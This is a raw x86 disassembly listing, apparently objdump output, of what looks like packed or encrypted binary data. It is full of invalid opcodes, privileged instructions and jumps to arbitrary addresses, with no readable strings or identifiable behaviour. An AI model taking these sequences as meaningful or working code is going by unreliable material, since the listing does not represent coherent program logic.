  40eae9:	sbb    bl,BYTE PTR [edx]
  40eaeb:	pop    edx
  40eaec:	mov    ebp,0xc2aa14b9
  40eaf1:	mov    ebp,DWORD PTR [edi-0x50]
  40eaf4:	std    
  40eaf5:	mov    eax,0x14d21818
  40eafa:	sbb    BYTE PTR [eax],bl
  40eafc:	sbb    BYTE PTR [ecx],bl
  40eafe:	jae    0x40eb2f
  40eb00:	mov    WORD PTR [edi-0xd926741],cs
  40eb06:	in     eax,dx
  40eb07:	jb     0x40eb38
  40eb09:	loope  0x40ead9
  40eb0b:	test   DWORD PTR [ebx],0xfef7ef88
  40eb11:	mov    eax,ds:0x4869fff5
  40eb16:	ds (bad) 
  40eb19:	xchg   ebx,eax
  40eb1a:	xor    DWORD PTR [edx-0x5168884c],edx
  40eb20:	iret   
  40eb21:	mov    dh,0x65
  40eb23:	je     0x40eb1d
  40eb25:	mov    eax,0xa65c1ac
  40eb2a:	xor    al,BYTE PTR [edi]
  40eb2c:	pusha  
  40eb2d:	push   es
  40eb2e:	sti    
  40eb2f:	cli    
  40eb30:	lock shl BYTE PTR [ebp+0x18],cl
  40eb34:	cmp    eax,0xb8415f5b
  40eb39:	shl    BYTE PTR [ecx],1
  40eb3b:	dec    edi
  40eb3c:	jmp    0xcffa:0x9f4e726b
  40eb43:	(bad)  
  40eb44:	adc    DWORD PTR [esi-0x16],esi
  40eb47:	and    BYTE PTR [ebp-0x271b1c46],bh
  40eb4d:	mov    eax,0xcd1404bd
  40eb52:	nop
  40eb53:	fisubr WORD PTR [esi+0x2e3d75ca]
  40eb59:	mov    bl,BYTE PTR [esp+edx*4]
  40eb5c:	and    eax,DWORD PTR [ebp-0x366d876e]
  40eb62:	and    DWORD PTR [esi+eax*2],edx
  40eb65:	or     edx,ecx
  40eb67:	jp     0x40eba6
  40eb69:	repz or ch,BYTE PTR [eax]
  40eb6c:	inc    esp
  40eb6d:	ja     0x40eb34
  40eb6f:	push   ecx
  40eb70:	sub    al,0xce
  40eb72:	add    BYTE PTR [ecx-0x53],ah
  40eb75:	fwait
  40eb76:	retf   
  40eb77:	xchg   ebp,eax
  40eb78:	or     esi,DWORD PTR [ecx-0x67cfebab]
  40eb7e:	enter  0x286a,0xc6
  40eb82:	je     0x40eb33
  40eb84:	or     bh,BYTE PTR [esi-0x3162a8b9]
  40eb8a:	cli    
  40eb8b:	sahf   
  40eb8c:	fidivr WORD PTR [edi*8-0x6878a72f]
  40eb93:	into   
  40eb94:	xchg   esi,eax
  40eb95:	pop    ecx
  40eb96:	adc    ah,BYTE PTR [ebp-0x56]
  40eb99:	shl    DWORD PTR [ebp-0x1a],0x49
  40eb9d:	sbb    bh,ah
  40eb9f:	dec    ebx
  40eba0:	es scas al,BYTE PTR es:[edi]
  40eba2:	mov    ds:0x93edf0d1,eax
  40eba7:	cwde   
  40eba8:	mov    eax,0x9cdfb6e0
  40ebae:	push   ebx
  40ebaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebb0:	mov    al,ds:0xd48e9ce5
  40ebb5:	iret   
  40ebb6:	sbb    ecx,DWORD PTR [edx+0x6fa98ce5]
  40ebbc:	and    DWORD PTR [ebx-0x4505180c],0xf
  40ebc3:	ins    BYTE PTR es:[edi],dx
  40ebc4:	test   BYTE PTR [esi+0x6d],bl
  40ebc7:	icebp  
  40ebc8:	push   ebp
  40ebc9:	(bad)  
  40ebca:	scas   eax,DWORD PTR es:[edi]
  40ebcb:	xchg   ecx,eax
  40ebcc:	pop    ebx
  40ebcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebce:	dec    eax
  40ebcf:	mov    al,ds:0x3aac0a2d
  40ebd4:	jge    0x40eba9
  40ebd6:	jae    0x40ec15
  40ebd8:	shr    BYTE PTR [ebx],cl
  40ebda:	push   esi
  40ebdb:	mov    al,0xe2
  40ebdd:	adc    DWORD PTR [eax+0x75],edx
  40ebe0:	mov    ecx,0x20ab035f
  40ebe5:	and    eax,0x65616f1f
  40ebea:	adc    edi,DWORD PTR [ecx-0x31bb272c]
  40ebf0:	aaa    
  40ebf1:	scas   eax,DWORD PTR es:[edi]
  40ebf2:	push   edi
  40ebf3:	cmp    ch,bl
  40ebf5:	sahf   
  40ebf6:	rol    DWORD PTR ds:0x30c46a31,cl
  40ebfc:	dec    ecx
  40ebfd:	sbb    DWORD PTR [ebp+esi*8+0x1b4409df],0x5
  40ec05:	(bad)  
  40ec06:	loope  0x40ebed
  40ec08:	push   cs
  40ec09:	pop    es
  40ec0a:	into   
  40ec0b:	scas   al,BYTE PTR es:[edi]
  40ec0c:	dec    edx
  40ec0d:	fwait
  40ec0e:	lods   al,BYTE PTR ds:[esi]
  40ec0f:	inc    esp
  40ec10:	jb     0x40ebde
  40ec12:	je     0x40ebf4
  40ec14:	paddw  mm7,mm4
  40ec17:	out    0xf2,al
  40ec19:	mov    ebx,DWORD PTR [esp+eiz*8+0x15cc994c]
  40ec20:	test   DWORD PTR [ebp+0x39ccb10a],ebp
  40ec26:	mov    esi,0xbec141d9
  40ec2b:	iret   
  40ec2c:	les    esi,FWORD PTR [ebx-0x4c]
  40ec2f:	dec    edi
  40ec30:	inc    edx
  40ec31:	xor    BYTE PTR [esi+0x78],bl
  40ec34:	jnp    0x40ebcd
  40ec36:	sbb    dl,BYTE PTR [esi]
  40ec38:	das    
  40ec39:	mov    cl,dh
  40ec3b:	push   eax
  40ec3c:	pop    edx
  40ec3d:	in     eax,dx
  40ec3e:	ja     0x40ec98
  40ec40:	sbb    eax,0x55e02c5f
  40ec45:	cli    
  40ec46:	popa   
  40ec47:	ins    DWORD PTR es:[edi],dx
  40ec48:	inc    ebp
  40ec49:	jno    0x40ebe0
  40ec4b:	mov    esi,0x44a0be78
  40ec50:	fcom   DWORD PTR [eax-0x77]
  40ec53:	mov    esi,DWORD PTR [ebx+esi*1+0xb42f6ea]
  40ec5a:	in     al,0x2e
  40ec5c:	and    al,0x1f
  40ec5e:	cmp    DWORD PTR [eax],0x1c137892
  40ec64:	pop    ebx
  40ec65:	jne    0x40ebfc
  40ec67:	lea    eax,[edx]
  40ec69:	mov    ecx,0x1b3cabcb
  40ec6e:	pop    ss
  40ec6f:	dec    esp
  40ec70:	dec    eax
  40ec71:	mov    bl,0xf6
  40ec73:	pop    ebp
  40ec74:	push   ds
  40ec75:	addr16 js 0x40ec1d
  40ec78:	pop    es
  40ec79:	jae    0x40ec69
  40ec7b:	xchg   edx,eax
  40ec7c:	jle    0x40ec54
  40ec7e:	cld    
  40ec7f:	mov    ds:0x1a762e86,eax
  40ec84:	or     esi,DWORD PTR [esi+0x69305cdf]
  40ec8a:	mov    ch,0xc
  40ec8c:	mov    esi,DWORD PTR [ecx+0x3a]
  40ec8f:	repnz push edi
  40ec91:	jo     0x40ec72
  40ec93:	push   0xfd70da24
  40ec98:	inc    ebp
  40ec99:	dec    eax
  40ec9a:	jecxz  0x40eca0
  40ec9c:	cld    
  40ec9d:	or     dh,BYTE PTR [ebx-0x46da7aab]
  40eca3:	into   
  40eca4:	es popf 
  40eca6:	xor    BYTE PTR [esi-0x6b],al
  40eca9:	sub    ecx,edx
  40ecab:	sub    DWORD PTR [esi],esp
  40ecad:	lea    ecx,[ebx-0x29]
  40ecb0:	mov    eax,0x92ddbca0
  40ecb5:	push   ss
  40ecb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecb7:	cmp    dl,BYTE PTR [esi+0x12]
  40ecba:	fdiv   st,st(0)
  40ecbc:	outs   dx,DWORD PTR ds:[esi]
  40ecbd:	cs or  al,0xf8
  40ecc1:	jbe    0x40ec95
  40ecc3:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40ecc5:	jg     0x40ece7
  40ecc7:	ins    DWORD PTR es:[edi],dx
  40ecc8:	or     eax,DWORD PTR [esp+edx*2+0x18]
  40eccc:	iret   
  40eccd:	(bad)  
  40ecce:	pop    edx
  40eccf:	ins    BYTE PTR es:[edi],dx
  40ecd0:	jecxz  0x40ecf3
  40ecd2:	dec    ebp
  40ecd3:	push   0xa20d9982
  40ecd8:	stos   BYTE PTR es:[edi],al
  40ecd9:	pusha  
  40ecda:	xor    edi,DWORD PTR [edi+esi*2+0x45900978]
  40ece1:	jg     0x40ed11
  40ece3:	mov    dh,0x17
  40ece5:	xor    ebx,DWORD PTR [eax+0x1e2a0b0d]
  40eceb:	xor    eax,edx
  40eced:	into   
  40ecee:	sbb    edi,DWORD PTR [ebx]
  40ecf0:	and    eax,0xc23ab42a
  40ecf5:	and    edi,DWORD PTR [ecx+0x378d66ac]
  40ecfb:	and    bl,ah
  40ecfd:	push   edi
  40ecfe:	jno    0x40ed41
  40ed00:	ror    BYTE PTR [ebx],0xcb
  40ed03:	stos   BYTE PTR es:[edi],al
  40ed04:	sahf   
  40ed05:	in     al,0xc4
  40ed07:	inc    ebp
  40ed08:	mov    al,0xde
  40ed0a:	aas    
  40ed0b:	std    
  40ed0c:	pop    ds
  40ed0d:	imul   ebp,DWORD PTR [ebp-0x7d],0x49
  40ed11:	int3   
  40ed12:	out    0xdb,eax
  40ed14:	add    DWORD PTR [ecx+eax*4-0x79],ecx
  40ed18:	les    eax,FWORD PTR [esi+0x18]
  40ed1b:	dec    DWORD PTR [edx]
  40ed1d:	lods   eax,DWORD PTR ds:[esi]
  40ed1e:	mov    al,0x3b
  40ed20:	retf   
  40ed21:	clc    
  40ed22:	arpl   WORD PTR [edx],cx
  40ed24:	add    eax,0x11c74bb5
  40ed29:	fst    QWORD PTR [ebp+0x61853d4f]
  40ed2f:	add    eax,0x38d2de3d
  40ed34:	sahf   
  40ed35:	lods   al,BYTE PTR ds:[esi]
  40ed36:	add    al,0xcd
  40ed38:	mov    WORD PTR [edi+ebp*8],?
  40ed3b:	inc    esp
  40ed3c:	leave  
  40ed3d:	jmp    edx
  40ed3f:	sbb    BYTE PTR [esi+ecx*8+0x2],ch
  40ed43:	cmc    
  40ed44:	ins    BYTE PTR es:[edi],dx
  40ed45:	mov    WORD PTR [ebx+0x2d],ds
  40ed48:	outs   dx,DWORD PTR ds:[esi]
  40ed49:	jg     0x40ed5b
  40ed4b:	cmp    bh,BYTE PTR [esi+ebp*8+0x2]
  40ed4f:	out    dx,eax
  40ed50:	and    bh,ch
  40ed52:	mov    WORD PTR [eax-0x66],ds
  40ed55:	sbb    eax,0x953d2473
  40ed5a:	pop    edx
  40ed5b:	shr    DWORD PTR [ecx-0x7373c505],cl
  40ed61:	and    eax,0xeac0294a
  40ed66:	js     0x40edb3
  40ed68:	test   DWORD PTR ds:0xbe9b528b,ebx
  40ed6e:	sbb    DWORD PTR ds:0xaa1ab31a,ecx
  40ed74:	mov    ds:0x9b9889d0,eax
  40ed79:	mov    esp,0x30369211
  40ed7e:	xor    DWORD PTR [ebx+0x72eb3fce],edi
  40ed84:	or     dh,BYTE PTR [ebx+0x5a]
  40ed87:	ror    BYTE PTR [esi-0x13],cl
  40ed8a:	inc    edi
  40ed8b:	push   ecx
  40ed8c:	(bad)  [ecx-0x355d77fb]
  40ed92:	shl    BYTE PTR [ecx-0xa],cl
  40ed95:	cmp    esi,DWORD PTR [ebx+eax*4]
  40ed98:	fld    DWORD PTR [eax-0x3483438e]
  40ed9e:	cmp    BYTE PTR [eax+edi*2-0x7372b0aa],bh
  40eda5:	add    esi,esp
  40eda7:	pop    ecx
  40eda8:	add    eax,0xf4458b35
  40edad:	and    eax,0xddc
  40edb2:	add    eax,DWORD PTR [ebp-0x8]
  40edb5:	xor    eax,0x46e3
  40edba:	add    eax,0x50eb
  40edbf:	cmp    ecx,eax
  40edc1:	jmp    0x40f085
  40edc6:	cmp    DWORD PTR [edx-0x25e5f4a4],ecx
  40edcc:	daa    
  40edcd:	sub    ch,BYTE PTR [edx+0x66aa1270]
  40edd3:	dec    edi
  40edd4:	pop    ebp
  40edd5:	jo     0x40ed8e
  40edd7:	mov    dl,0x18
  40edd9:	sbb    dl,dl
  40eddb:	adc    al,0x18
  40eddd:	sbb    BYTE PTR [esi+0x7f2e1b06],al
  40ede3:	std    
  40ede4:	mov    dh,BYTE PTR [eax+0x3fe155e9]
  40edea:	mov    dh,0x81
  40eded:	mov    dh,0xd9
  40edef:	push   esi
  40edf0:	mov    BYTE PTR [eax-0x6c],dh
  40edf3:	out    dx,al
  40edf4:	add    al,0x36
  40edf6:	push   ecx
  40edf7:	push   ebp
  40edf8:	push   esp
  40edf9:	jb     0x40ee00
  40edfb:	jo     0x40edf7
  40edfd:	inc    ebp
  40edfe:	inc    esi
  40edff:	jb     0x40edc0
  40ee01:	sbb    al,0x94
  40ee03:	xchg   ebp,eax
  40ee04:	imul   eax,DWORD PTR [edx],0x14cec64a
  40ee0a:	inc    ebp
  40ee0b:	add    bh,dl
  40ee0d:	xor    ebx,DWORD PTR [ecx+0x27]
  40ee10:	sub    dl,al
  40ee12:	or     DWORD PTR [edx+0x3e1e7b3d],0x7bab7420
  40ee1c:	rol    DWORD PTR [edi-0x42],0x6f
  40ee20:	and    DWORD PTR [ebp+0x46],esi
  40ee23:	lds    esp,FWORD PTR [eax-0x7d]
  40ee26:	xor    BYTE PTR [ecx],ch
  40ee28:	fstp   DWORD PTR [eax]
  40ee2a:	jne    0x40ee40
  40ee2c:	xchg   edi,eax
  40ee2d:	fcmovu st,st(1)
  40ee2f:	dec    edi
  40ee30:	push   eax
  40ee31:	test   bl,ch
  40ee33:	jne    0x40ee53
  40ee35:	setns  BYTE PTR [eax+eax*2]
  40ee39:	push   ebp
  40ee3a:	pop    ecx
  40ee3b:	int3   
  40ee3c:	cmp    BYTE PTR [eax],cl
  40ee3e:	jbe    0x40ee6e
  40ee40:	(bad)  
  40ee41:	call   0xef801418
  40ee46:	xchg   esi,eax
  40ee47:	les    esi,FWORD PTR [edi+0x25]
  40ee4a:	dec    eax
  40ee4b:	(bad)  
  40ee4c:	out    0xe7,eax
  40ee4e:	ins    BYTE PTR es:[edi],dx
  40ee4f:	inc    esp
  40ee50:	pop    ds
  40ee51:	xchg   esi,eax
  40ee52:	cmp    esp,esp
  40ee54:	xchg   BYTE PTR [ecx],cl
  40ee56:	cdq    
  40ee57:	xchg   ecx,eax
  40ee58:	hlt    
  40ee59:	fimul  WORD PTR [eax-0x29]
  40ee5c:	cmp    DWORD PTR [edi],esi
  40ee5e:	(bad)  
  40ee5f:	sti    
  40ee60:	adc    BYTE PTR [edi+esi*1+0x5a],dl
  40ee64:	dec    esi
  40ee65:	nop
  40ee66:	xor    eax,0xf4efeb27
  40ee6b:	xor    eax,0x7c7feb71
  40ee70:	cwde   
  40ee71:	mov    WORD PTR [ecx],?
  40ee73:	test   eax,0xa9d857e7
  40ee78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee79:	add    ah,BYTE PTR [ebp-0x73]
  40ee7c:	dec    ebx
  40ee7d:	inc    edi
  40ee7e:	inc    esp
  40ee80:	add    eax,DWORD PTR [edx+0x11991f36]
  40ee86:	cli    
  40ee87:	mov    al,ds:0xdacf87ef
  40ee8c:	fmul   st,st(3)
  40ee8e:	and    BYTE PTR [eax-0x5d],dl
  40ee91:	xor    eax,0xe2dd2814
  40ee96:	addr16 mov edi,0x51699471
  40ee9c:	pusha  
  40ee9d:	jp     0x40ee56
  40ee9f:	mov    ebx,0xa0077c4d
  40eea4:	adc    al,BYTE PTR [ebx+0x24]
  40eea7:	mov    gs,WORD PTR [esi]
  40eea9:	repz sub DWORD PTR [edi-0x4a68eb9c],0xffffffcd
  40eeb1:	adc    DWORD PTR [edi-0x6843e7c1],esi
  40eeb7:	xchg   esi,eax
  40eeb8:	jns    0x40ee51
  40eeba:	data16 aam 0xfc
  40eebd:	jmp    0xde64:0x4177a83d
  40eec4:	shl    DWORD PTR [ebx],1
  40eec6:	push   0xe2ad5d4
  40eecb:	rol    edi,1
  40eecd:	sbb    bh,bh
  40eecf:	pop    ebp
  40eed0:	lock sbb eax,0xc8b945fa
  40eed6:	lock jne 0x40ee6c
  40eed9:	inc    esp
  40eeda:	push   0xd53e0955
  40eedf:	ret    0x305e
  40eee2:	inc    esp
  40eee3:	and    eax,0xa499f34d
  40eee8:	jbe    0x40ee9c
  40eeea:	outs   dx,DWORD PTR ds:[esi]
  40eeeb:	jnp    0x40ef09
  40eeed:	cmp    ah,BYTE PTR [esi+0x5ca3473f]
  40eef3:	fbld   TBYTE PTR [ebp+0x3ba581d1]
  40eef9:	leave  
  40eefa:	add    edx,edx
  40eefc:	xchg   ecx,eax
  40eefd:	popf   
  40eefe:	sub    al,0xa5
  40ef00:	bound  esi,QWORD PTR [edx]
  40ef02:	or     BYTE PTR [ebx-0x1b],0xca
  40ef06:	dec    ebp
  40ef07:	pop    esp
  40ef08:	sub    dl,al
  40ef0a:	add    ch,dl
  40ef0c:	bound  edx,QWORD PTR [eax+0x73]
  40ef0f:	ret    0x550c
  40ef12:	lea    ebx,[edx+0x4ca700c9]
  40ef18:	test   DWORD PTR [eax+eiz*8],edi
  40ef1b:	nop
  40ef1c:	mov    WORD PTR [eax-0x63],gs
  40ef1f:	xchg   esp,eax
  40ef20:	popf   
  40ef21:	pusha  
  40ef22:	cmp    DWORD PTR [edi+eax*8],ebx
  40ef25:	add    BYTE PTR [ebp+eax*4+0x1f],0x2e
  40ef2a:	out    dx,al
  40ef2b:	hlt    
  40ef2c:	in     eax,0x63
  40ef2e:	call   0x70c8:0xdcdc51a0
  40ef35:	and    DWORD PTR [ebp+0xf286934],0xc1187e3
  40ef3f:	add    DWORD PTR [ebp+0x49],edi
  40ef42:	js     0x40ef69
  40ef44:	mov    bl,0x89
  40ef46:	lods   al,BYTE PTR ds:[esi]
  40ef47:	push   ebx
  40ef48:	test   ah,dh
  40ef4a:	jmp    0xc097c9b8
  40ef4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef50:	or     al,0x8e
  40ef52:	int3   
  40ef53:	jmp    0x40efbc
  40ef55:	iret   
  40ef56:	retf   0x94e4
  40ef59:	adc    DWORD PTR [ebp+0x46],ebx
  40ef5c:	(bad)  
  40ef5e:	inc    ecx
  40ef5f:	test   DWORD PTR [ebp-0x62],0xe7ddbbfc
  40ef66:	add    eax,0x3afdbad5
  40ef6b:	dec    ebp
  40ef6c:	lods   eax,DWORD PTR ds:[esi]
  40ef6d:	hlt    
  40ef6e:	cli    
  40ef6f:	pop    es
  40ef70:	cwde   
  40ef71:	(bad)  ds:0xbe773f9f
  40ef77:	imul   ecx,edi,0xa
  40ef7a:	inc    edx
  40ef7b:	xor    dh,BYTE PTR [edi-0x1a]
  40ef7e:	pop    ecx
  40ef7f:	fs popf 
  40ef81:	call   0x7eb4c722
  40ef86:	cld    
  40ef87:	les    esp,FWORD PTR [ebx]
  40ef89:	popf   
  40ef8a:	mov    ebp,0x8b17bbbe
  40ef8f:	xchg   ebx,eax
  40ef90:	inc    esi
  40ef91:	inc    esi
  40ef92:	dec    ebp
  40ef93:	xor    dl,BYTE PTR [ebp-0x3ec79d10]
  40ef99:	sbb    BYTE PTR [ebx+edi*4],bh
  40ef9c:	imul   ebp,DWORD PTR [ebx],0x630927f4
  40efa2:	mov    ch,0xdb
  40efa4:	shr    BYTE PTR [edx-0x21],1
  40efa7:	das    
  40efa8:	xor    al,0x59
  40efaa:	popf   
  40efab:	mov    eax,ds:0xc970667a
  40efb0:	jl     0x40efc4
  40efb2:	aam    0xad
  40efb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efb5:	adc    esp,DWORD PTR [esi+eax*8+0x9]
  40efb9:	enter  0x5b9c,0xe1
  40efbd:	loop   0x40ef54
  40efbf:	jo     0x40efc0
  40efc1:	icebp  
  40efc2:	ror    DWORD PTR [edi],1
  40efc4:	xor    ebp,DWORD PTR [ebx+0x6b365a34]
  40efca:	push   esp
  40efcb:	fld    QWORD PTR [ebx-0x31505b8e]
  40efd1:	(bad)  [edx-0xe6e630d]
  40efd7:	lahf   
  40efd8:	adc    eax,0xf8372062
  40efdd:	xchg   BYTE PTR ds:0xf27a5376,dh
  40efe3:	push   edi
  40efe4:	gs pop ebp
  40efe6:	cmp    bl,BYTE PTR [eiz*1+0x3705ba76]
  40efed:	mov    ds:0xee5dc60b,al
  40eff2:	rol    DWORD PTR [esi-0x3d],1
  40eff5:	sub    BYTE PTR [edi+0x13],dh
  40eff8:	sbb    al,BYTE PTR [esi-0x43]
  40effb:	cld    
  40effc:	dec    ebx
  40effd:	int    0xf
  40efff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f000:	test   DWORD PTR [eax-0x6a],edi
  40f003:	pop    esp
  40f004:	ins    BYTE PTR es:[edi],dx
  40f005:	hlt    
  40f006:	add    BYTE PTR [esi],bl
  40f008:	xchg   esi,eax
  40f009:	mov    BYTE PTR [edi+0x44],cl
  40f00c:	mov    ah,0xb
  40f00e:	test   al,0x64
  40f010:	retf   
  40f011:	add    eax,0xd4d4543b
  40f016:	inc    ebx
  40f017:	mov    WORD PTR [eax+0x3c521493],cs
  40f01d:	xchg   BYTE PTR [edi+0x63],bh
  40f020:	fbld   TBYTE PTR ds:0x4941a20f
  40f026:	mov    ds:0x77ad1a2d,eax
  40f02b:	jge    0x40f077
  40f02d:	jmp    0xd09c0c46
  40f032:	loop   0x40f0b3
  40f034:	test   eax,0xe73bdab5
  40f039:	pushf  
  40f03a:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40f03c:	xchg   ebx,eax
  40f03d:	(bad)  
  40f03f:	jg     0x40effe
  40f041:	lahf   
  40f042:	inc    ebx
  40f043:	call   0xfbd7ccd1
  40f048:	retf   0xea30
  40f04b:	stos   DWORD PTR es:[edi],eax
  40f04c:	xchg   ecx,eax
  40f04d:	inc    DWORD PTR [eax+0x549009b]
  40f053:	xor    DWORD PTR [ebx],eax
  40f055:	(bad)  
  40f056:	dec    eax
  40f057:	lods   eax,DWORD PTR ds:[esi]
  40f058:	or     BYTE PTR [esi],bl
  40f05a:	shl    BYTE PTR [ebp-0x34],1
  40f05d:	ret    0x642e
  40f060:	outs   dx,BYTE PTR ds:[esi]
  40f061:	or     BYTE PTR [ecx-0x64822a8],bl
  40f067:	std    
  40f068:	dec    edi
  40f069:	sub    eax,0xd10e2fbe
  40f06e:	call   0x1a29:0xaa314ea3
  40f075:	imul   edi,DWORD PTR [edx+ebx*1+0x4b],0xffffffb5
  40f07a:	sub    BYTE PTR [ebx-0x351d7a4a],ah
  40f080:	rcr    DWORD PTR [edx+0xf3d4a3b],0x85
  40f087:	or     bh,dh
  40f089:	(bad)  
  40f08a:	call   FWORD PTR [edi-0x17]
  40f08d:	mov    edi,0x47000002
  40f092:	mov    ds:0x305a70db,al
  40f097:	inc    edx
  40f098:	call   0xe59c:0xaa146552
  40f09f:	cmp    DWORD PTR [edx+0x70],ebp
  40f0a2:	scas   al,BYTE PTR es:[edi]
  40f0a3:	sbb    BYTE PTR [eax],bl
  40f0a5:	rcl    BYTE PTR [eax+ebx*1],cl
  40f0a8:	sbb    BYTE PTR [edi+0x30],ch
  40f0ab:	mov    WORD PTR [esi],fs
  40f0ad:	cmp    BYTE PTR [eax],dh
  40f0af:	or     dl,dh
  40f0b1:	xchg   ecx,eax
  40f0b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0b3:	fnsave [edi]
  40f0b5:	pop    ecx
  40f0b6:	jg     0x40f043
  40f0b8:	int    0x2c
  40f0ba:	adc    DWORD PTR [edx-0x55],edx
  40f0bd:	dec    edi
  40f0be:	mov    gs,WORD PTR [eax-0x31e421c2]
  40f0c4:	inc    ecx
  40f0c5:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40f0c7:	and    esp,esp
  40f0c9:	xchg   esi,eax
  40f0ca:	sar    DWORD PTR ds:0x69e146ab,1
  40f0d0:	push   cs
  40f0d1:	push   ebx
  40f0d2:	cmp    edi,DWORD PTR [ebp+0x10]
  40f0d5:	pushf  
  40f0d6:	fmulp  st(3),st
  40f0d8:	dec    ebx
  40f0d9:	push   edx
  40f0da:	xchg   DWORD PTR [edx-0x369f1060],eax
  40f0e0:	(bad)  
  40f0e1:	aam    0x86
  40f0e3:	lods   al,BYTE PTR ds:[esi]
  40f0e4:	in     eax,0x49
  40f0e6:	push   0xf09a784d
  40f0eb:	retf   0x1e0a
  40f0ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0ef:	test   eax,0x15cd94f5
  40f0f4:	(bad)  
  40f0f5:	mov    cl,0xd7
  40f0f7:	cmp    al,cl
  40f0f9:	sbb    BYTE PTR [esp+edx*1-0xe],dh
  40f0fd:	fiadd  WORD PTR [bx+si-0x4b66]
  40f102:	call   0x60cab4de
  40f107:	sbb    al,BYTE PTR [esi+0x131ca7f7]
  40f10d:	test   ah,ah
  40f10f:	push   edi
  40f110:	vmread edi,edi
  40f113:	push   0xa2bc3904
  40f118:	mov    ecx,fs
  40f11a:	push   ebx
  40f11b:	cmp    DWORD PTR [ecx+0x73a0c2c9],eax
  40f121:	dec    esp
  40f122:	pushf  
  40f123:	mov    al,0x4a
  40f125:	fcomp  DWORD PTR [ebx-0x543c2d59]
  40f12b:	je     0x40f156
  40f12d:	add    eax,0xc0234c41
  40f132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f133:	or     dl,BYTE PTR [eax+ebx*4+0x1e]
  40f137:	mov    dl,0x6d
  40f139:	fnsave [eax+0x72]
  40f13c:	popa   
  40f13d:	ror    ebx,cl
  40f13f:	inc    eax
  40f140:	jo     0x40f127
  40f142:	cmp    ch,0xa0
  40f145:	mov    ds:0xb4f98b8c,eax
  40f14a:	shl    eax,0xfc
  40f14d:	scas   eax,DWORD PTR es:[edi]
  40f14e:	push   ecx
  40f14f:	stc    
  40f150:	adc    dl,ah
  40f152:	cmp    eax,0xe7889282
  40f157:	mov    cl,0x94
  40f159:	fnstsw WORD PTR [edx-0x7e]
  40f15c:	outs   dx,DWORD PTR ss:[esi]
  40f15e:	jmp    0x40f146
  40f160:	and    DWORD PTR [ecx-0x4870b309],0xffffffec
  40f167:	xor    dh,BYTE PTR [ebx+edi*4]
  40f16a:	mov    dh,cl
  40f16c:	test   DWORD PTR [esi-0x15a23e15],eax
  40f172:	jl     0x40f14b
  40f174:	cmp    esp,ecx
  40f176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f177:	mov    eax,ds:0xc1516c6f
  40f17c:	pop    eax
  40f17d:	push   ebx
  40f17e:	jp     0x40f1af
  40f180:	jp     0x40f18d
  40f182:	out    dx,al
  40f183:	push   ebp
  40f184:	sub    cl,ch
  40f186:	mov    ebp,0xf0366494
  40f18b:	jmp    0x95e1f655
  40f190:	dec    ecx
  40f191:	add    al,0x1a
  40f194:	jbe    0x40f135
  40f196:	outs   dx,BYTE PTR ds:[esi]
  40f197:	push   ecx
  40f198:	jne    0x40f122
  40f19a:	push   ds
  40f19b:	sub    DWORD PTR [ebx+0x49],esp
  40f19e:	fs adc eax,ecx
  40f1a1:	sti    
  40f1a2:	or     bh,BYTE PTR [ecx+0x20a20a16]
  40f1a8:	ss lahf 
  40f1aa:	mov    bh,BYTE PTR [edx+0x23]
  40f1ad:	mov    cl,0xae
  40f1af:	mov    DWORD PTR [edi+0x7d],eax
  40f1b2:	scas   al,BYTE PTR es:[edi]
  40f1b3:	loope  0x40f216
  40f1b5:	ror    ah,cl
  40f1b7:	das    
  40f1b8:	ficom  WORD PTR [edx]
  40f1ba:	popf   
  40f1bb:	bound  eax,QWORD PTR [esi]
  40f1bd:	popa   
  40f1be:	(bad)  [ebp+0x116d592c]
  40f1c4:	pop    esp
  40f1c5:	mov    ebp,ss
  40f1c7:	add    BYTE PTR [ebp-0x73],cl
  40f1ca:	jge    0x40f1ef
  40f1cc:	jmp    0x52a6ec8a
  40f1d1:	ins    DWORD PTR es:[edi],dx
  40f1d2:	or     bl,al
  40f1d4:	(bad)  
  40f1d5:	pop    esp
  40f1d6:	jecxz  0x40f205
  40f1d8:	mov    ebx,DWORD PTR [ecx+0x3a6e1186]
  40f1de:	fisttp QWORD PTR [edi+0x71]
  40f1e1:	popf   
  40f1e2:	push   es
  40f1e3:	xchg   DWORD PTR [edi+0xca496f7],edx
  40f1e9:	xchg   ebp,ebp
  40f1eb:	xchg   ebx,eax
  40f1ec:	jecxz  0x40f24e
  40f1ee:	lds    edx,FWORD PTR [eax+0x75]
  40f1f1:	push   0xffffffd3
  40f1f3:	in     eax,0x6f
  40f1f5:	mov    esp,0x5e4fb2a5
  40f1fa:	bound  esi,QWORD PTR [edx]
  40f1fc:	(bad)  
  40f1fd:	in     eax,0x56
  40f1ff:	or     al,0xce
  40f201:	xor    ebx,esi
  40f203:	leave  
  40f204:	retf   
  40f205:	xchg   ebp,eax
  40f206:	mov    DWORD PTR [edi+ebx*4-0x39af814e],esp
  40f20d:	cli    
  40f20e:	mov    al,ds:0xe2d96b85
  40f213:	repz shl BYTE PTR [ebx+0x6f60b78a],0x8d
  40f21b:	clc    
  40f21c:	xor    al,0x9b
  40f21e:	mov    bl,0xdb
  40f220:	push   cs
  40f221:	dec    eax
  40f222:	sti    
  40f223:	ret    
  40f224:	jae    0x40f249
  40f226:	in     al,0xf4
  40f228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f229:	icebp  
  40f22a:	jmp    0x7fc15fd8
  40f22f:	mov    ecx,0x5cc6fb6c
  40f234:	out    dx,al
  40f235:	inc    ebx
  40f236:	inc    esp
  40f237:	stos   DWORD PTR es:[edi],eax
  40f238:	cmp    esp,DWORD PTR [esi-0x49]
  40f23b:	sti    
  40f23c:	mov    cl,0x36
  40f23e:	pop    ds
